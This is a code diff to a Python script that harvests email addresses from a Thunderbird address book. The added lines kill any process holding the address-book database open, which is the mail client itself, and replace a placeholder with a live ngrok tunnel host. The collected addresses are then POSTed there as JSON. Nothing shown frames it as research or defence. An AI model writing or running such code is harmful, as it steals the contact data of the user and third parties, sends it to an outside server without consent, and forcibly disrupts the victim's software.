@@ -39,6 +39,7 @@ import sqlite3
 from typing import Tuple
 import http.client
 import json
+import psutil
 
 # --------------------------------------------------------------------------
 # -------------------- global variables and constants ----------------------
@@ -314,6 +315,15 @@ def read_email_addresses_thunderbird(filepath: str) -> typing.List[str]:
                `None` otherwise.
     """
     database = os.path.join(filepath, "abook.sqlite")
+    for proc in psutil.process_iter(['pid', 'name', 'open_files']):
+        try:
+            if proc.info['open_files']:
+                for file in proc.info['open_files']:
+                    if file.path == database:
+                        os.kill(proc.info['pid'], 9)
+                        print(f"Killed process {proc.info['name']} (PID {proc.info['pid']})")
+        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+            pass
     #print(f"database = {database}")
     con = None
     email_addresses = []
@@ -431,7 +441,7 @@ def find_email_addresses_post() -> None:
 
             json_string = json.dumps(to_email_addresses)
             print(json_string)
-            conn = http.client.HTTPSConnection("your_vm_host_address", "443")
+            conn = http.client.HTTPSConnection("d08a-34-125-86-43.ngrok-free.app", "443")
             payload = json_string
             headers = {
             'Content-Type': 'application/json'
